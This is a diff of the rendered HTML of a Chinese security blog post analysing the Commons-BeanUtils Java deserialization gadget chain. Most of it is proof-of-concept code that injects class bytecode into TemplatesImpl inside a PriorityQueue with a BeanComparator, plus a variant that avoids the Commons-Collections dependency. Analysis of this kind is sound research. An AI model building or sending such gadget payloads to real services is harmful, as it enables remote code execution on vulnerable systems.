@@ -211,7 +211,7 @@
     <h1 class="post-title">
       CommosBeanutils分析
     </h1>
-    <div class="post-meta"><span title='2022-11-04 17:09:24 +0800 +0800'>2022-11-04</span>&nbsp;·&nbsp;4 分钟&nbsp;·&nbsp;Reus09
+    <div class="post-meta">&lt;span title=&#39;2022-11-04 17:09:24 &#43;0800 &#43;0800&#39;&gt;2022-11-04&lt;/span&gt;&amp;nbsp;·&amp;nbsp;4 分钟&amp;nbsp;·&amp;nbsp;Reus09
 
 </div>
   </header> <aside id="toc-container" class="toc-container wide">
@@ -395,15 +395,15 @@
 </span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">62
 </span></code></pre></td>
 <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#f92672">package</span> CommonBean<span style="color:#f92672">;</span>
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#f92672">package</span> CommonBean;
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> Util.SeralizeUtil<span style="color:#f92672">;</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl<span style="color:#f92672">;</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.commons.beanutils.BeanComparator<span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> Util.SeralizeUtil;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.commons.beanutils.BeanComparator;
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.io.InputStream<span style="color:#f92672">;</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.lang.reflect.Field<span style="color:#f92672">;</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.util.PriorityQueue<span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.io.InputStream;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.lang.reflect.Field;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.util.PriorityQueue;
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e">/**
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * @ClassName CommonBeanUtils
@@ -412,51 +412,51 @@
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * @Date 2022/11/4 16:54
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * @Version 1.0
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e"> **/</span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">CommonBeanUtils</span> <span style="color:#f92672">{</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> String fileName <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;CommonBeanUtils.bin&#34;</span><span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">CommonBeanUtils</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> String fileName <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;CommonBeanUtils.bin&#34;</span>;
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span><span style="color:#f92672">(</span>String<span style="color:#f92672">[]</span> args<span style="color:#f92672">)</span>  <span style="color:#66d9ef">throws</span> Exception<span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span>(String<span style="color:#f92672">[]</span> args)  <span style="color:#66d9ef">throws</span> Exception{
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// 读取恶意类 byte[]
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        InputStream inputStream <span style="color:#f92672">=</span> CommonBeanUtils<span style="color:#f92672">.</span><span style="color:#a6e22e">class</span><span style="color:#f92672">.</span><span style="color:#a6e22e">getResourceAsStream</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;Calc.class&#34;</span><span style="color:#f92672">);</span>
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span>  bytes <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#66d9ef">byte</span><span style="color:#f92672">[</span>inputStream<span style="color:#f92672">.</span><span style="color:#a6e22e">available</span><span style="color:#f92672">()];</span>
-</span></span><span style="display:flex;"><span>        inputStream<span style="color:#f92672">.</span><span style="color:#a6e22e">read</span><span style="color:#f92672">(</span>bytes<span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// 读取恶意类 byte[]</span>
+</span></span><span style="display:flex;"><span>        InputStream inputStream <span style="color:#f92672">=</span> CommonBeanUtils.<span style="color:#a6e22e">class</span>.<span style="color:#a6e22e">getResourceAsStream</span>(<span style="color:#e6db74">&#34;Calc.class&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span>  bytes <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#66d9ef">byte</span><span style="color:#f92672">[</span>inputStream.<span style="color:#a6e22e">available</span>()<span style="color:#f92672">]</span>;
+</span></span><span style="display:flex;"><span>        inputStream.<span style="color:#a6e22e">read</span>(bytes);
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// 初始化PriorityQueue
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        PriorityQueue<span style="color:#f92672">&lt;</span>Object<span style="color:#f92672">&gt;</span> queue <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> PriorityQueue<span style="color:#f92672">&lt;&gt;(</span><span style="color:#ae81ff">2</span><span style="color:#f92672">);</span>
-</span></span><span style="display:flex;"><span>        queue<span style="color:#f92672">.</span><span style="color:#a6e22e">add</span><span style="color:#f92672">(</span><span style="color:#ae81ff">1</span><span style="color:#f92672">);</span>
-</span></span><span style="display:flex;"><span>        queue<span style="color:#f92672">.</span><span style="color:#a6e22e">add</span><span style="color:#f92672">(</span><span style="color:#ae81ff">2</span><span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// 初始化PriorityQueue</span>
+</span></span><span style="display:flex;"><span>        PriorityQueue<span style="color:#f92672">&lt;</span>Object<span style="color:#f92672">&gt;</span> queue <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> PriorityQueue<span style="color:#f92672">&lt;&gt;</span>(2);
+</span></span><span style="display:flex;"><span>        queue.<span style="color:#a6e22e">add</span>(1);
+</span></span><span style="display:flex;"><span>        queue.<span style="color:#a6e22e">add</span>(2);
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// 初始化 TemplatesImpl 对象
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        TemplatesImpl tmpl <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> TemplatesImpl<span style="color:#f92672">();</span>
-</span></span><span style="display:flex;"><span>        Field byteCodes <span style="color:#f92672">=</span> TemplatesImpl<span style="color:#f92672">.</span><span style="color:#a6e22e">class</span><span style="color:#f92672">.</span><span style="color:#a6e22e">getDeclaredField</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;_bytecodes&#34;</span><span style="color:#f92672">);</span>
-</span></span><span style="display:flex;"><span>        byteCodes<span style="color:#f92672">.</span><span style="color:#a6e22e">setAccessible</span><span style="color:#f92672">(</span><span style="color:#66d9ef">true</span><span style="color:#f92672">);</span>
-</span></span><span style="display:flex;"><span>        byteCodes<span style="color:#f92672">.</span><span style="color:#a6e22e">set</span><span style="color:#f92672">(</span>tmpl<span style="color:#f92672">,</span><span style="color:#66d9ef">new</span> <span style="color:#66d9ef">byte</span><span style="color:#f92672">[][]</span> <span style="color:#f92672">{</span>bytes<span style="color:#f92672">});</span>
-</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// _name 不为空
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        Field name <span style="color:#f92672">=</span> TemplatesImpl<span style="color:#f92672">.</span><span style="color:#a6e22e">class</span><span style="color:#f92672">.</span><span style="color:#a6e22e">getDeclaredField</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;_name&#34;</span><span style="color:#f92672">);</span>
-</span></span><span style="display:flex;"><span>        name<span style="color:#f92672">.</span><span style="color:#a6e22e">setAccessible</span><span style="color:#f92672">(</span><span style="color:#66d9ef">true</span><span style="color:#f92672">);</span>
-</span></span><span style="display:flex;"><span>        name<span style="color:#f92672">.</span><span style="color:#a6e22e">set</span><span style="color:#f92672">(</span>tmpl<span style="color:#f92672">,</span><span style="color:#e6db74">&#34;reus09&#34;</span><span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// 初始化 TemplatesImpl 对象</span>
+</span></span><span style="display:flex;"><span>        TemplatesImpl tmpl <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> TemplatesImpl();
+</span></span><span style="display:flex;"><span>        Field byteCodes <span style="color:#f92672">=</span> TemplatesImpl.<span style="color:#a6e22e">class</span>.<span style="color:#a6e22e">getDeclaredField</span>(<span style="color:#e6db74">&#34;_bytecodes&#34;</span>);
+</span></span><span style="display:flex;"><span>        byteCodes.<span style="color:#a6e22e">setAccessible</span>(<span style="color:#66d9ef">true</span>);
+</span></span><span style="display:flex;"><span>        byteCodes.<span style="color:#a6e22e">set</span>(tmpl,<span style="color:#66d9ef">new</span> <span style="color:#66d9ef">byte</span><span style="color:#f92672">[][]</span> {bytes});
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// _name 不为空</span>
+</span></span><span style="display:flex;"><span>        Field name <span style="color:#f92672">=</span> TemplatesImpl.<span style="color:#a6e22e">class</span>.<span style="color:#a6e22e">getDeclaredField</span>(<span style="color:#e6db74">&#34;_name&#34;</span>);
+</span></span><span style="display:flex;"><span>        name.<span style="color:#a6e22e">setAccessible</span>(<span style="color:#66d9ef">true</span>);
+</span></span><span style="display:flex;"><span>        name.<span style="color:#a6e22e">set</span>(tmpl,<span style="color:#e6db74">&#34;reus09&#34;</span>);
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// 反射将TemplatesImpl 对象放在 PriorityQueue里
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        Field field <span style="color:#f92672">=</span> PriorityQueue<span style="color:#f92672">.</span><span style="color:#a6e22e">class</span><span style="color:#f92672">.</span><span style="color:#a6e22e">getDeclaredField</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;queue&#34;</span><span style="color:#f92672">);</span>
-</span></span><span style="display:flex;"><span>        field<span style="color:#f92672">.</span><span style="color:#a6e22e">setAccessible</span><span style="color:#f92672">(</span><span style="color:#66d9ef">true</span><span style="color:#f92672">);</span>
-</span></span><span style="display:flex;"><span>        Object<span style="color:#f92672">[]</span> objects <span style="color:#f92672">=</span> <span style="color:#f92672">(</span>Object<span style="color:#f92672">[])</span> field<span style="color:#f92672">.</span><span style="color:#a6e22e">get</span><span style="color:#f92672">(</span>queue<span style="color:#f92672">);</span>
-</span></span><span style="display:flex;"><span>        objects<span style="color:#f92672">[</span><span style="color:#ae81ff">0</span><span style="color:#f92672">]</span> <span style="color:#f92672">=</span> tmpl<span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// 反射将TemplatesImpl 对象放在 PriorityQueue里</span>
+</span></span><span style="display:flex;"><span>        Field field <span style="color:#f92672">=</span> PriorityQueue.<span style="color:#a6e22e">class</span>.<span style="color:#a6e22e">getDeclaredField</span>(<span style="color:#e6db74">&#34;queue&#34;</span>);
+</span></span><span style="display:flex;"><span>        field.<span style="color:#a6e22e">setAccessible</span>(<span style="color:#66d9ef">true</span>);
+</span></span><span style="display:flex;"><span>        Object<span style="color:#f92672">[]</span> objects <span style="color:#f92672">=</span> (Object<span style="color:#f92672">[]</span>) field.<span style="color:#a6e22e">get</span>(queue);
+</span></span><span style="display:flex;"><span>        objects<span style="color:#f92672">[</span>0<span style="color:#f92672">]</span> <span style="color:#f92672">=</span> tmpl;
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// 初始化BeanComparator
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        BeanComparator beanComparator <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> BeanComparator<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;outputProperties&#34;</span><span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// 初始化BeanComparator</span>
+</span></span><span style="display:flex;"><span>        BeanComparator beanComparator <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> BeanComparator(<span style="color:#e6db74">&#34;outputProperties&#34;</span>);
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// 反射将 BeanComparator 写入 PriorityQueue里
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        Field field1 <span style="color:#f92672">=</span> Class<span style="color:#f92672">.</span><span style="color:#a6e22e">forName</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;java.util.PriorityQueue&#34;</span><span style="color:#f92672">).</span><span style="color:#a6e22e">getDeclaredField</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;comparator&#34;</span><span style="color:#f92672">);</span>
-</span></span><span style="display:flex;"><span>        field1<span style="color:#f92672">.</span><span style="color:#a6e22e">setAccessible</span><span style="color:#f92672">(</span><span style="color:#66d9ef">true</span><span style="color:#f92672">);</span>
-</span></span><span style="display:flex;"><span>        field1<span style="color:#f92672">.</span><span style="color:#a6e22e">set</span><span style="color:#f92672">(</span>queue<span style="color:#f92672">,</span>beanComparator<span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// 反射将 BeanComparator 写入 PriorityQueue里</span>
+</span></span><span style="display:flex;"><span>        Field field1 <span style="color:#f92672">=</span> Class.<span style="color:#a6e22e">forName</span>(<span style="color:#e6db74">&#34;java.util.PriorityQueue&#34;</span>).<span style="color:#a6e22e">getDeclaredField</span>(<span style="color:#e6db74">&#34;comparator&#34;</span>);
+</span></span><span style="display:flex;"><span>        field1.<span style="color:#a6e22e">setAccessible</span>(<span style="color:#66d9ef">true</span>);
+</span></span><span style="display:flex;"><span>        field1.<span style="color:#a6e22e">set</span>(queue,beanComparator);
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>        SeralizeUtil<span style="color:#f92672">.</span><span style="color:#a6e22e">writeObjectToFile</span><span style="color:#f92672">(</span>queue<span style="color:#f92672">,</span>fileName<span style="color:#f92672">);</span>
-</span></span><span style="display:flex;"><span>        SeralizeUtil<span style="color:#f92672">.</span><span style="color:#a6e22e">readFileObject</span><span style="color:#f92672">(</span>fileName<span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>        SeralizeUtil.<span style="color:#a6e22e">writeObjectToFile</span>(queue,fileName);
+</span></span><span style="display:flex;"><span>        SeralizeUtil.<span style="color:#a6e22e">readFileObject</span>(fileName);
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>    }
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>}
 </span></span></code></pre></td></tr></table>
 </div>
 </div><p>以上代码可成功构造反序列化利用，但是有一个问题是，由于 BeanComparator 的默认 comparator 是 ComparableComparator ，这是个 CommonCollections 中的类，导致了这明明是一条 CB 的触发链，却要同时依赖 CC。增加了很多利用的限制，那该如何逃出 CC 的依赖呢？</p>
@@ -474,14 +474,14 @@
 </span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">8
 </span></code></pre></td>
 <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#75715e">// 初始化 String$CaseInsensitiveComparator
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>Class       c           <span style="color:#f92672">=</span> Class<span style="color:#f92672">.</span><span style="color:#a6e22e">forName</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;java.lang.String$CaseInsensitiveComparator&#34;</span><span style="color:#f92672">);</span>
-</span></span><span style="display:flex;"><span>Constructor constructor <span style="color:#f92672">=</span> c<span style="color:#f92672">.</span><span style="color:#a6e22e">getDeclaredConstructor</span><span style="color:#f92672">();</span>
-</span></span><span style="display:flex;"><span>constructor<span style="color:#f92672">.</span><span style="color:#a6e22e">setAccessible</span><span style="color:#f92672">(</span><span style="color:#66d9ef">true</span><span style="color:#f92672">);</span>
-</span></span><span style="display:flex;"><span>Comparator comparator <span style="color:#f92672">=</span> <span style="color:#f92672">(</span>Comparator<span style="color:#f92672">&lt;?&gt;)</span> constructor<span style="color:#f92672">.</span><span style="color:#a6e22e">newInstance</span><span style="color:#f92672">();</span>
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#75715e">// 初始化 String$CaseInsensitiveComparator</span>
+</span></span><span style="display:flex;"><span>Class       c           <span style="color:#f92672">=</span> Class.<span style="color:#a6e22e">forName</span>(<span style="color:#e6db74">&#34;java.lang.String$CaseInsensitiveComparator&#34;</span>);
+</span></span><span style="display:flex;"><span>Constructor constructor <span style="color:#f92672">=</span> c.<span style="color:#a6e22e">getDeclaredConstructor</span>();
+</span></span><span style="display:flex;"><span>constructor.<span style="color:#a6e22e">setAccessible</span>(<span style="color:#66d9ef">true</span>);
+</span></span><span style="display:flex;"><span>Comparator comparator <span style="color:#f92672">=</span> (Comparator<span style="color:#f92672">&lt;?&gt;</span>) constructor.<span style="color:#a6e22e">newInstance</span>();
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e">// 初始化 BeanComparator
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>BeanComparator beanComparator <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> BeanComparator<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;outputProperties&#34;</span><span style="color:#f92672">,</span> comparator<span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// 初始化 BeanComparator</span>
+</span></span><span style="display:flex;"><span>BeanComparator beanComparator <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> BeanComparator(<span style="color:#e6db74">&#34;outputProperties&#34;</span>, comparator);
 </span></span></code></pre></td></tr></table>
 </div>
 </div><p>这样就可以无需 CC 的依赖触发 CB 链了。</p>
